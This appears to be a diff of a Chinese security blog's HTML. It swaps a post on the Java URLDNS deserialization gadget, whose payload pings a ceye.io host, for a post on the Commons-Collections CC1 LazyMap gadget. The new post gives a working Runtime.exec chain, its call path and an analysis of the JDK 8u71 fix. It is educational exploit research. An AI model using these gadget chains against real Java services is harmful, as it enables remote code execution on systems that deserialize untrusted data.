@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="java-sec: 01. urldns, outlaws&#39;s blog">
+    <meta name="keywords" content="java-sec: 03. cc1-way2, outlaws&#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>java-sec: 01. urldns | outlaws&#39;s blog</title>
+    <title>java-sec: 03. cc1-way2 | outlaws&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -313,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">java-sec: 01. urldns</h1>
+                    <h1 class="description center-align post-title">java-sec: 03. cc1-way2</h1>
                 </div>
             </div>
         </div>
@@ -438,8 +438,12 @@
                                 <span class="chip bg-color">java</span>
                             </a>
                         
-                            <a href="/tags/urldns/">
-                                <span class="chip bg-color">urldns</span>
+                            <a href="/tags/cc1/">
+                                <span class="chip bg-color">cc1</span>
+                            </a>
+                        
+                            <a href="/tags/LazyMap/">
+                                <span class="chip bg-color">LazyMap</span>
                             </a>
                         
                     </div>
@@ -454,7 +458,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-07-01
+                    2022-07-09
                 </div>
                 
 
@@ -478,122 +482,70 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>通过设置HashMap中key(java.net.URL)的hashCode=-1触发hashCode的重新计算，从而造成DNS解析。</p>
-<h2 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>outlaws<span class="token punctuation">.</span>urldns</span><span class="token punctuation">;</span>
+                <h1 id="CommonCollections1-way2"><a href="#CommonCollections1-way2" class="headerlink" title="CommonCollections1 - way2"></a>CommonCollections1 - way2</h1><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p>JDK8 version &lt; 8u71</p>
+<h2 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRCEByLazyMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
 
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
+        <span class="token comment">// 生成序列化流，在8u71前有效</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token comment">/**
- * @auther : outlaws
- * @date : 2022/7/1 19:21
- * @use : 
- * @https://github.com/outlaws-bai/java-sec/blob/main/src/main/java/com/outlaws/urldns/URLDNS.java
- */</span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> URLDNS <span class="token punctuation">{</span>
+        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
-        <span class="token comment">//1.加载Class对象</span>
-        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//利用java反射机制获取url的hashcode</span>
-        <span class="token class-name">Field</span> filed <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//因为hashCode是私有方法，所以要设置true</span>
-        filed<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//这里直接new 一个对象</span>
-        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://b.7e1t2z.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">// 这里set是因为hashCode默认为-1，设置一个不为-1的，就不会本地触发dns解析</span>
-        filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">0x1111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">// hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span>
-        filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//序列化成对象，输出出来</span>
         <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">ObjectOutputStream</span> objos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//        System.out.println(barr);</span>
+        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//1.加载Class对象</span>
-<span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//利用java反射机制获取url的hashcode</span>
-<span class="token class-name">Field</span> filed <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//因为hashCode是私有方法，所以要设置true</span>
-filed<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><p>与上一篇文章<a target="_blank" rel="noopener" href="https://www.outlaws.top/2022/07/03/java-sec-02-cc1/">cc1-TransformedMap</a>不同之处主要在于LazyMap</p>
+<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform() ，factory.transform就会执行我们构造好的transformerChain导致rce。</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709163230790.png" alt="image-20220709163230790"></p>
+<p>在<a target="_blank" rel="noopener" href="https://www.outlaws.top/2022/07/03/java-sec-02-cc1/">cc1-TransformedMap</a>中我们是利用sun.reflect.annotation.AnnotationInvocationHandler的readObject()方法执行了put操作，进而执行TransformedMap中我们的回调transformerChain，从而导致rce。而在LazyMap的利用中我们发现sun.reflect.annotation.AnnotationInvocationHandler的readObject()方法并没有直接执行LazyMap的get方法，但在invoke方法中发现有调用，因此可以用到代理</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709163902696.png" alt="image-20220709163902696"></p>
+<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>示例代码参考<a target="_blank" rel="noopener" href="https://github.com/outlaws-bai/java-sec/tree/main/src/main/java/com/outlaws/basic/proxy">java基础-proxy</a></p>
+<p>FileSystem是一个interface仅有一个list列文件方法。</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165457960.png" alt="image-20220709165457960"></p>
+<p>UnixFileSystem实现了FileSystem接口。</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165505415.png" alt="image-20220709165505415"></p>
+<p>JDKInvocationHandler是一个代理类，实现了对被代理对象的方法处理逻辑。</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165512255.png" alt="image-20220709165512255"></p>
+<p>FileSystemProxyTest测试整个代理流程</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165522189.png" alt="image-20220709165522189"></p>
+<p>执行结果如下</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171848090.png" alt="image-20220709171848090"></p>
+<p>我们不难发现在被代理的对象UnixFileSystem中每个方法执行的时候，都会调用JDKInvocationHandler的invoke()方法，因此知道这点就不难理解整个利用链了</p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre class="line-numbers language-none"><code class="language-none">sun.reflect.annotation.AnnotationInvocationHandler#readObject()
+sun.reflect.annotation.AnnotationInvocationHandler#invoke()
+LazyMap#get()
+ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>首先利用反射获取到java.net.URL类，再利用反射获取到java.net.URL类中的hashCode属性并将其设为公有变量。</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>将url的hashCode属性设置为-1，这样才能触发url解析。</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>触发HashMap的readObject()方法</p>
-<h2 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h2><p>通过payload我们发现最终调用的是HashMap的readObject()方法，进入查看</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161810739.png"></p>
-<p>再跟进1413行hash(key)</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703162030960.png"></p>
-<p>此时会去获取key的hashCode()函数获取hashCode，而我们的key是java.net.URL，所以此时会去调用java.net.URL的hashCode()方法，继续更进</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161824219.png"></p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161904508.png"></p>
-<p>发现当hashCode等于-1时，会重新计算hashCode，通过URLStreamHandler的hashCode()方法</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161912130.png"></p>
-<p>在这里就会进行一次DNS解析。</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161918308.png"></p>
-<p>完整调用链如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">HashMap#readObject()
-HashMap#hash()
-URL#hashCode()
-URLStreamHandler#hashCode()
-URLStreamHandler#getHostAddress()
-URLStreamHandler#getHostAddress()
-InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject()中会调用LazyMap中的方法，而我们对LazyMap中的方法进行了代理，使得它的所有方法被执行前都会先执行sun.reflect.annotation.AnnotationInvocationHandler#invoke()方法，sun.reflect.annotation.AnnotationInvocationHandler#invoke()方法会调用LazyMap#get()从而调用ChainedTransformer#transform()，触发rce。</p>
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>我们发现这个gadget也是只能在8u71以下使用，对比下官方的修复发现</p>
+<p>在8u71以下sun.reflect.annotation.AnnotationInvocationHandler的属性memberValues来源于初始化时传入的第二个参数，即LazyMap的实例化对象outerMap，并且在readObject也不会对其属性就行改变</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171716396.png" alt="image-20220709171716396"></p>
+<p>而在8u71以上虽然memberValues也是初始化的第二个参数，但是我们发现在sun.reflect.annotation.AnnotationInvocationHandler#readObject()</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171132174.png" alt="image-20220709171132174"></p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171155551.png" alt="image-20220709171155551"></p>
+<p>它会把memberValues修改为LinkedHashMap，这样的话在sun.reflect.annotation.AnnotationInvocationHandler#invoke()中的get操作不会是调用LazyMap#get()方法，而是变成了LinkedHashMap#get()，从而修复了该条利用链。</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709172615414.png" alt="image-20220709172615414"></p>
 
                 
             </div>
@@ -620,7 +572,7 @@ InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://outlaws.top/2022/07/01/java-sec-01-urldns/">https://outlaws.top/2022/07/01/java-sec-01-urldns/</a>
+                    <a href="https://outlaws.top/2022/07/09/java-sec-03-cc1-way2/">https://outlaws.top/2022/07/09/java-sec-03-cc1-way2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -662,8 +614,12 @@ InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><s
                                     <span class="chip bg-color">java</span>
                                 </a>
                             
-                                <a href="/tags/urldns/">
-                                    <span class="chip bg-color">urldns</span>
+                                <a href="/tags/cc1/">
+                                    <span class="chip bg-color">cc1</span>
+                                </a>
+                            
+                                <a href="/tags/LazyMap/">
+                                    <span class="chip bg-color">LazyMap</span>
                                 </a>
                             
                         </div>
@@ -709,9 +665,64 @@ InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/07/09/java-sec-03-cc1-way2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="java-sec: 03. cc1-way2">
+                        
+                        <span class="card-title">java-sec: 03. cc1-way2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            outlaws
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                    <a href="/tags/cc1/">
+                        <span class="chip bg-color">cc1</span>
+                    </a>
+                    
+                    <a href="/tags/LazyMap/">
+                        <span class="chip bg-color">LazyMap</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2022/07/03/java-sec-02-cc1/">
                     <div class="card-image">
@@ -729,9 +740,9 @@ InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><s
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -753,56 +764,6 @@ InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><s
                     
                     <a href="/tags/TransformedMap/">
                         <span class="chip bg-color">TransformedMap</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
